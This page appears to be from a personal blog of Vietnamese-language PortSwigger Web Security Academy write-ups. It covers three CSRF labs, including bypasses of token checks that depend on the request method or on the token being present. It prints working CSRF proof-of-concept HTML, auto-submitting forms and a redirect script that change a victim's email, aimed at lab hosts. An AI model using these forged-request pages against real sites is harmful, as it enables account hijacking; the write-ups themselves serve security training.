@@ -1,0 +1,2082 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="My PortSwigger Web Security Academy writeups">
+      
+      
+        <meta name="author" content="Thanh Dat Hoang">
+      
+      
+        <link rel="canonical" href="https://hoangdat2407.github.io/myblog/Portswigger/CSRF/">
+      
+      
+        <link rel="prev" href="../CORS/">
+      
+      
+        <link rel="next" href="../DOM-based%20vulnerabilities/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>CSRF - PortSwigger Writeups</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#csrf" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="PortSwigger Writeups" class="md-header__button md-logo" aria-label="PortSwigger Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            PortSwigger Writeups
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              CSRF
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="PortSwigger Writeups" class="md-nav__button md-logo" aria-label="PortSwigger Writeups" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    PortSwigger Writeups
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Server-side
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Server-side
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Access%20control%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Access Control
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Authentication%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authentication
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Business%20logic%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Business Logic
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../File%20upload%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../GraphQL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GraphQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Information%20disclosure/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Information Disclosure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure%20deserialize/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Insecure Deserialization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../JWT%20attack/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    JWT Attack
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../NoSQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NoSQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Oauth/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OAuth
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OS%20command%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OS Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Path%20traversal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Path Traversal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Prototype%20polution/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Prototype Pollution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Race%20condition/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Race Condition
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Server%20side%20template%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20cache%20poisoning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Cache Poisoning
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web%20socket/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    WebSocket
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XML%20external%20entity%20%28XXE%29%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Client-side
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Client-side
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Clickjacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Clickjacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CORS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CORS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../DOM-based%20vulnerabilities/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DOM-based Vulnerabilities
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="csrf">CSRF<a class="headerlink" href="#csrf" title="Permanent link">&para;</a></h1>
+<h1 id="lab-csrf-vulnerability-with-no-defenses"><strong>Lab: CSRF vulnerability with no defenses</strong><a class="headerlink" href="#lab-csrf-vulnerability-with-no-defenses" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/csrf/lab-no-defenses">Lab: CSRF vulnerability with no defenses | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện login vào tài khoản <code>wiener:peter</code> .  Điều hướng đến chức năng <code>My account &gt; Update email</code></p>
+<p><img alt="image.png" src="image.png" /></p>
+</li>
+<li>
+<p>Thực hiện update email. Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API <code>POST /my-account/change-email</code> . Thực hiện tạo form html từ request này như sau:</p>
+<ul>
+<li>
+<p>Tạo form HTML</p>
+<p><img alt="image.png" src="image%201.png" /></p>
+</li>
+<li>
+<p>Copy form HTML</p>
+<p><img alt="image.png" src="image%202.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi form trên cho victim bằng cách dùng exploit server</p>
+<ul>
+<li>
+<p>Exploit server</p>
+<ul>
+<li>
+<p>Head</p>
+<div class="highlight"><pre><span></span><code>HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+  <span class="cm">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>
+  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://0a6b00d703fbec7f8049035c00f70074.web-security-academy.net/my-account/change-email&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;a&amp;#64;a&amp;#46;com&quot;</span> <span class="p">/&gt;</span>
+      <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Submit request&quot;</span> <span class="p">/&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">      </span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
+<span class="w">      </span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện <code>View exploit</code> thấy đổi email thành công</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%203.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện <code>Deliver exploit to victim</code> . Hoàn thành giải lab</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%204.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-csrf-where-token-validation-depends-on-request-method"><strong>Lab: CSRF where token validation depends on request method</strong><a class="headerlink" href="#lab-csrf-where-token-validation-depends-on-request-method" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method">Lab: CSRF where token validation depends on request method | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện login vào tài khoản <code>wiener:peter</code> . Điều hướng đến chức năng <code>My account &gt; Update email</code> và thực hiện update email</p>
+<p><img alt="image.png" src="image%205.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện bắt và chuyển request gửi tới API <code>POST /my-account/change-email</code> và chuyển sang tab <code>Repeater</code></p>
+<p><img alt="image.png" src="image%206.png" /></p>
+</li>
+<li>
+<p>Trong Repeater, thực hiện change request method như sau:</p>
+<ul>
+<li>
+<p>Click chuột phải, chọn <code>Change request method</code></p>
+<p><img alt="image.png" src="image%207.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi request với method <code>GET</code> và quan sát thấy vẫn cập nhật email thành công</p>
+<ul>
+<li>
+<p>Request</p>
+<div class="highlight"><pre><span></span><code><span class="nx">GET</span><span class="w"> </span><span class="o">/</span><span class="nx">my</span><span class="o">-</span><span class="nx">account</span><span class="o">/</span><span class="nx">change</span><span class="o">-</span><span class="nx">email</span><span class="o">?</span><span class="nx">email</span><span class="o">=</span><span class="nx">a1</span><span class="o">%</span><span class="mf">40</span><span class="nx">a</span><span class="p">.</span><span class="nx">com</span><span class="w"> </span><span class="nx">HTTP</span><span class="o">/</span><span class="mf">2</span>
+<span class="nx">Host</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="nx">a1900a304c2a0c48003a80100290083</span><span class="p">.</span><span class="nx">web</span><span class="o">-</span><span class="nx">security</span><span class="o">-</span><span class="nx">academy</span><span class="p">.</span><span class="nx">net</span>
+<span class="nx">Cookie</span><span class="o">:</span><span class="w"> </span><span class="nx">session</span><span class="o">=</span><span class="nx">SVVxrZp78RO49gr2uDd6IVa3zfC0owka</span>
+</code></pre></div>
+</li>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%208.png" /></p>
+<p><img alt="image.png" src="image%209.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Copy url change email và gửi cho victim bằng exploit server</p>
+<ul>
+<li>
+<p>Exploit server</p>
+<ul>
+<li>
+<p>Head</p>
+<div class="highlight"><pre><span></span><code><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="nx">OK</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span><span class="w"> </span><span class="nx">charset</span><span class="o">=</span><span class="nx">utf</span><span class="o">-</span><span class="mf">8</span>
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="nx">location</span><span class="o">=</span><span class="s2">&quot;https://0a1900a304c2a0c48003a80100290083.web-security-academy.net/my-account/change-email?email=a1%40a.com&quot;</span><span class="p">;</span>
+<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện <code>Deliver to victim</code> và quan sát thấy hoàn thành giải lab</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2010.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="lab-csrf-where-token-validation-depends-on-token-being-present"><strong>Lab: CSRF where token validation depends on token being present</strong><a class="headerlink" href="#lab-csrf-where-token-validation-depends-on-token-being-present" title="Permanent link">&para;</a></h1>
+<p><a href="https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present">Lab: CSRF where token validation depends on token being present | Web Security Academy</a></p>
+<ul>
+<li>
+<p>Thực hiện login với tài khoản <code>wiener:peter</code> . Điều hướng đến chức năng <code>My account &gt; Update email</code></p>
+<p><img alt="image.png" src="image%2011.png" /></p>
+</li>
+<li>
+<p>Trong phần mềm Burpsuite, thực hiện và chuyển request gửi tới API <code>POST /my-account/change-email</code> sang tab Repeater.</p>
+<p><img alt="image.png" src="image%2012.png" /></p>
+</li>
+<li>
+<p>Quan sát rằng khi thực hiện xóa <code>csrf</code> thì vẫn đổi email thành công</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2013.png" /></p>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện gửi form đổi email mà không có csrf token cho victim bằng exploit server</p>
+<ul>
+<li>
+<p>Exploit server</p>
+<ul>
+<li>
+<p>Head</p>
+<div class="highlight"><pre><span></span><code><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span><span class="w"> </span><span class="mf">200</span><span class="w"> </span><span class="nx">OK</span>
+<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span><span class="w"> </span><span class="nx">text</span><span class="o">/</span><span class="nx">html</span><span class="p">;</span><span class="w"> </span><span class="nx">charset</span><span class="o">=</span><span class="nx">utf</span><span class="o">-</span><span class="mf">8</span>
+</code></pre></div>
+</li>
+<li>
+<p>Body</p>
+<div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+<span class="w">  </span><span class="c">&lt;!--</span><span class="w"> </span><span class="nx">CSRF</span><span class="w"> </span><span class="nx">PoC</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">generated</span><span class="w"> </span><span class="nx">by</span><span class="w"> </span><span class="nx">Burp</span><span class="w"> </span><span class="nx">Suite</span><span class="w"> </span><span class="nx">Professional</span><span class="w"> </span><span class="o">--&gt;</span>
+<span class="w">  </span><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="p">&lt;</span><span class="nt">form</span><span class="w"> </span><span class="na">action</span><span class="o">=</span><span class="s">&quot;https://0a59002403d3e0d780d6170c00450078.web-security-academy.net/my-account/change-email&quot;</span><span class="w"> </span><span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+<span class="w">      </span><span class="p">&lt;</span><span class="nt">input</span><span class="w"> </span><span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span><span class="w"> </span><span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span><span class="w"> </span><span class="na">value</span><span class="o">=</span><span class="s">&quot;a1&amp;#64;a&amp;#46;com&quot;</span><span class="w"> </span><span class="p">/&gt;</span>
+<span class="w">      </span><span class="p">&lt;</span><span class="nt">input</span><span class="w"> </span><span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span><span class="w"> </span><span class="na">value</span><span class="o">=</span><span class="s">&quot;Submit request&quot;</span><span class="w"> </span><span class="p">/&gt;</span>
+<span class="w">    </span><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="w">    </span><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">      </span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
+<span class="w">      </span><span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mf">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
+<span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="w">  </span><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</code></pre></div>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Thực hiện deliver to victim. Quan sát thấy hoàn thành giải lab</p>
+<ul>
+<li>
+<p>POC</p>
+<p><img alt="image.png" src="image%2014.png" /></p>
+</li>
+</ul>
+</li>
+</ul>
